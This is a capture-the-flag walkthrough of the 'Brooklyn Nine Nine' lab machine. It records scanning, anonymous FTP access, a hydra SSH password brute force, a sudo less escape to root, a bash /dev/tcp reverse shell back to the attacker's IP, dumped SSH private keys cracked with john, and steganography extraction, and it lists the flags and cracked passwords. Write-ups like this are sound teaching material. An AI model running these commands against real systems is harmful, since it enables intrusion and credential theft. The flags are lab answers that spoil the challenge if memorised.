# Brooklyn Nine Nine

Laurent Chauvin | November 02, 2022

## Resources

[1] https://gtfobins.github.io/

[2] https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

## Progress

```
export IP=10.10.24.161
```

Nmap scan
```
nmap -sC -sV -oN nmap/initial $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-02 00:08 EDT
Nmap scan report for 10.10.24.161
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.23.136
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.60 seconds

```

Gobuster scan
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log 

===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.24.161
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/02 00:09:01 Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 277]
```

Nikto scan
```
nikto -h "http://$IP" | tee nikto.log

- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.24.161
+ Target Hostname:    10.10.24.161
+ Target Port:        80
+ Start Time:         2022-11-02 00:09:23 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2ce, size: 5a5ee14bb8d76, mtime: gzip
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2022-11-02 00:25:22 (GMT-4) (959 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

First thing, we can see anonymous ftp is allowed, and a 'note_to_jake.txt' is there.
Let's go get it.

```
ftp $IP
Connected to 10.10.24.161.
220 (vsFTPd 3.0.3)
Name (10.10.24.161:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||50798|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||14100|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |***********************************************************************************************************************************************************************************************|   119        1.41 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (0.47 KiB/s)
```

What's in it
```
cat note_to_jake.txt

From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

Jake seems to have a weak password, might be bruteforce.

Let's start ssh bruteforcing for user 'jake' on ftp. Maybe ssh if no luck on ftp.
```
hydra -l jake -P /opt/rockyou.txt ftp://$IP
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-02 00:12:34
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.10.24.161:21/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-02 00:12:39
```

No luck there. Try ssh.
```
hydra -l jake -P /opt/rockyou.txt ssh://$IP
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-02 00:13:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.24.161:22/
[22][ssh] host: 10.10.24.161   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-02 00:13:52
```

In the meantime, let's check website. Quick check on robots.txt but nothing.

Website source code show
```
<!-- Have you ever heard of steganography? -->
```

Let's download the image
```
wget http://10.10.24.161/brooklyn99.jpg
```

Need a passphrase to use with steghide. Let's put that aside for now.

Back to ssh. Nothing in jake's home directory.
```
jake@brookly_nine_nine:/home$ ls -al
total 20
drwxr-xr-x  5 root root 4096 May 18  2020 .
drwxr-xr-x 24 root root 4096 May 19  2020 ..
drwxr-xr-x  5 amy  amy  4096 May 18  2020 amy
drwxr-xr-x  6 holt holt 4096 May 26  2020 holt
drwxr-xr-x  6 jake jake 4096 May 26  2020 jake
```

Let's check other home directories
```
jake@brookly_nine_nine:/home$ ls amy/
jake@brookly_nine_nine:/home$ ls holt/
nano.save  user.txt
jake@brookly_nine_nine:/home$ cat holt/user.txt 
ee11cbb19052e40b07aac0ca060c23ee
jake@brookly_nine_nine:/home$ 
```

Time to privesc.

```
jake@brookly_nine_nine:/home/holt$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

Let's check GTFObins.
```
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

sudo less /etc/profile
!/bin/sh
```

Running
```
sudo less /etc/profile
!/bin/sh
```

I got
```
root@brookly_nine_nine:/home/holt# whoami
root
```

Let's get flag
```
root@brookly_nine_nine:/home/holt# cat /root/root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```

## Flag

1. User

```
ee11cbb19052e40b07aac0ca060c23ee
```

2. Privesc

```
63a9f0ea7bb98050796b649e85481845
```

## To Go Further

I noticed that in 'holt' home directory
```
root@brookly_nine_nine:/home/holt# ls .ssh/

id_rsa  id_rsa.pub
```

Let's try to crack Holt's password to show him he's not above :)

Let's start pwncat and get a reverse shell
```
cd /opt/pwncat
poetry shell
pwncat-cs -lp 9999
```

Now let's connect back, using a reverse shell from [2]
```
bash -i >& /dev/tcp/10.18.23.136/9999 0>&1
```

We got pwncat
```
pwncat-cs -lp 9999
[00:28:32] Welcome to pwncat 🐈!                                                                                                                                                                                             __main__.py:164
[00:30:02] received connection from 10.10.24.161:38804                                                                                                                                                                            bind.py:84
[00:30:05] 10.10.24.161:38804: registered new host w/ db                                                                                                                                                                      manager.py:957
(local) pwncat$                                                                                                                                                                                                                             
(remote) root@brookly_nine_nine:/home/holt# 
```

Keep getting 'permission denied' when trying to download it using pwncat. Let's go the old fashion way
```
cat id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7FEB01DFD04064BFFC03CBB293CEF0F9

8rta3aQd8iUsjaUJ7S+j4wUbMhIGhWaSFOwuyDvKOfTEuFpNSv5DkA/p6D7qcBIE
+YGVvFBPN3fOdnD0kyChCjRIsgtNsy2y/u2/ts7V8tsz/FqYHdpRDvn0btQc1WhV
K+T7Mgg1ou2Lk/I+u8VTFk7mtUbgrB1t8IIqX5fC5ISopggr/KK/0Lk5uGkpUnRr
gA+yiPx+6f5LNT3OwMeCfOI7zS+fqXsmM89mzsKcs6hmwlvGyg6UtwEO250vZJmE
ulDYrM9Y3hXAKxBXhKjAXUp3I07YRzvsupuiYqqgxTqcIRUlayq4CGnefqtmGnTd
kSrnnvsfEwGJwDVajVrFEdwIXh/5FKPxQSOYktrTzWnijzzJk8qBBxxtpCSzz0Zk
7/g/eDUWg6RpMDukWToQWlCS9lWQnOBBn2FHAHVmdnaHs9mjfDwtXg9Tvd5m9Nkk
Y06i/mjsrDV0v2PtlA9DnuSd8idaRQmcmXTbAJTVFUbpIGWuStFHI9SIq9IF2Wh1
h7iZZzSEWHuoBp70Ruoizu+/GuNnPs3nMFp/4x0dXztiwHPZ5K5g7fAjg0VZbPEB
dC+LxJ9LtULcWMe2AcD0aYPMckiSf+3emFAQCxGtqESuMZiUgd6D2dgDIu0Xi1OM
3sVX2gE4iDEonkilX+GLLUrwg82uhlGNyXuWtFl9Fhp3CiNyxi+zN54PrIeU6ADE
iBVyjazw10EGFuYO9x2/jkJ1LBnM/C7x582ZBSHgJBDLA287kPo8beaS31C6V7fH
pQJWHSN5Oo92e3whynqWSle/A045FRQsxxxQLDr1nM1wJlfXGpuqgs+mE4fF3UKk
rBM6ErFUVYUwcXIZ+NSkCV80teUimpIP0ul3tgXsag2lOgK20/K3nDJBQeg/7iGs
0PIjw6+o8BGJfeq5peGa5F6kuvnEGIAJsbChl4BAdEggO+aem1l7p33+zUUUOa49
HYrpmze3DkhE32ClE5oQB1D9hSdQKTz5RSBUw8EZhRHzvs7EuRd/q8xe+YWsmkB0
iK1T0hLcyOUnRy0xsXtbv65Ba1BPYyfvOHHZGTt0yHajp4hHsFb6FQrSylTOpTR7
yc34xdZH39H3wEiVymnJ4kVvJez6xKXGueY5ZQXXJnWPnddvFF+4u2/R2LQlt3BL
ODWUfNZP+9KDt6OexU8ZrT7SszYu8CoH0MoFtttaDNCZkuB0JxBQaQKiUXnRt3xv
S2blkjzd9dOo2Ebl0sebmcquySg9cgb31WnPSbVkzaBAm+V9geJUz0mwO0QpJD4g
8jiW6ph0l8Yv6iq2aeOWAm2zDOhJjOwAZpPefu4kBa9X7P5j6ekTHSOdwPAfMG8s
rEKDQsj5rvm/qpWAJwCgTuoPXGqMSNHwVBL4+Fmzc/cl5/PHdr3LS8CL2CJc+BrO
+le8hcPQQWmR4n1Lss6zUVB8ElzGnfGvqgnZ0DwJlsj+NHF+pK8sx2dz8Ywa5WXx
eApPx3ASu2agU8IRvq0Z6IuWw1rvprmiXyBWCQ9NBOjIo4dnL6cLE+UmVmQThxst
hnxQNnTVZlFLdM5mJjNyzCyfsdvyu5QxsDfEtTCLBH3P8ittfeSWv1WlF0b6nkUO
-----END RSA PRIVATE KEY-----
```

Let's get crackin'
```
ssh2john holt_id_rsa > holt_id_rsa_forJohn.txt
```

```
john holt_id_rsa_forJohn.txt --wordlist=/opt/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
kevin            (holt_id_rsa)     
1g 0:00:00:00 DONE (2022-11-02 00:36) 20.00g/s 5760p/s 5760c/s 5760C/s barcelona..brenda
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Not so strong of a passphrase Holt !!! :)

Let's crack Amy's passphrase too now.

```
cat id_rsa

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,8A45EF5CE95F44B523FBD6AEEAD2B9E6

//MOmD5ttJ6rTXqLiBtvOmCcXLWmgexGwQZc2sy6P9mVlh9nUD2g2gN/SwyOIOzo
pWBjAatk7qpqwbsGDstQsKErCDGCH/qjF49zG1meMNbzxFQAT5vOxGM/0oYJwD9F
BKeRcOqY0vKjiJz0Wf9ZA3+CF3xdjNvVhneGe3BE1jEX2J3+sGZ0qiNLkYn6Mw+h
jDLglBkq1qNxsGD1uKI6Hau4tOykPDphrhTiY+os7zyloEaVto53d1JUolL0W6qG
OwjIY37KP0VjwUClUivwu24yWJLZ8ISIy+PVb9AXcOSERxSFbXpuWMVurYpenc5a
TyinBbDZI31+xStteQYCb3SrnPlHQC1waAMr22RzXMSNpdJ29D7Use8CMMsBofFv
5v43IhNuNVuGik1Qoh4kg45aIW4PHpEIzHqz89hzHnTNJnbkZIri4VPDu1+tgeUB
YVXclhpOXj+AI8FeJix1OIW6lGQM48iApBq0GQn5877vxaepP2A2BU44Ips2WYvG
WxD8u9nW7muG8hEtU/Jmz1v1j5PIJm9BENkam/4/7VRbGw2RO3FUjpAHsdnzr+k5
yZ/sxWpVkIhbO3SO3/+TUTIAODZJ3fJB5fHspXCwIjWoU4ff6aW+LsDv5rpXbrxt
IqA+mpn31fwr0nmVYS/+seDA0atdFl6c+1Zav7dSoNF+hlqssxX7YXm3+LGQdQWa
gSNNSS3Cj6gyPUSs6+t0mKHzgnB/Ofah2epLzi9/K+UxKtyCjnKlYV8GSH+EZIPk
YPKGnzHet4QRrhP6YYeBfatDeblxIQZX1u6G9gGkWqFFIXgMe2wDyaoBA/cS2/am
GcS1SP0tNOZCsAMz5Q87YG44nhaSJReuUnna4fHBhti6pymWZYXvecovB/23xpNu
LDkoxmZDa/jUfO0Ua9xuhjp3usT3Nin2iAUl3inLXzpr6wQDoW1OuZbV6jitqdMv
v1Yf/Ycn5/g07aCpVAv8VyZ1J2/ilDOFuaVPQBJXKsm79fbLbXj2gTGjwKTo2JBa
EqPBMxD1X2gKxUQky9c/W1NfvZ1DqdU2+KC9o/qztuWRzO+MA/UwGKEJ93mcmeqA
6cxRy+IuzuS4/U7EegNLd6VkAJANYgXmr6Q3HlzuH8opFvh33VFejww4/w99jQfZ
mTSqSPS0QX9Sdo7U58IfDq+j13Il/aymcSWkBw6/DDwdDzl/7ZQ/X/XqE0Jjh1QY
Ro6xjI5LnDDCZjXkNu0Da/AfQG/Y0AzZUylhnH0/l4vdXPGDRffxlEQQNnGKwGk9
GSFvIHuEni9c/G7vW/wNgI9mSlycR02oCVyInHMepcLWDYyIAyFEyh/G65iGG0Z/
Y6cdOJSYTyuwVbK8469YHowvD4/7urHaSLeNmViT+URyoRLp9wV/8HaNMW5q5i6D
p0TrrdkFQiDR5X+rbfL+EgFYCwOanABkK+FzptbXB0ABte7L+PSICvZKsCn/yo6z
fxraAZ0nJejWQEYEH99o7T7uHkR+CZSD8gWPBsaP8pfPJSeKR9LzXG3MOWGc+5/p
gZBPQI5EwbUaWtnwEKqzTqT1G/+iYps8ExqUGj9lZWPnwNAEnWXiKJfTZF2lJyqz
-----END RSA PRIVATE KEY-----
```

```
john amy_id_rsa_forJohn.txt --wordlist=/opt/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
jake1            (amy_id_rsa)     
1g 0:00:00:00 DONE (2022-11-02 00:38) 16.66g/s 388800p/s 388800c/s 388800C/s joker69..iloveu4ever
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Cute !! :)

But....what to do with that background image?

Let's get back to it and run stegseed
```
stegseek brooklyn99.jpg /opt/rockyou.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".
```

```
cat brooklyn99.jpg.out

Holts Password:
fluffydog12@ninenine

Enjoy!!
```

Pretty strong password Holt, good job !!! :)
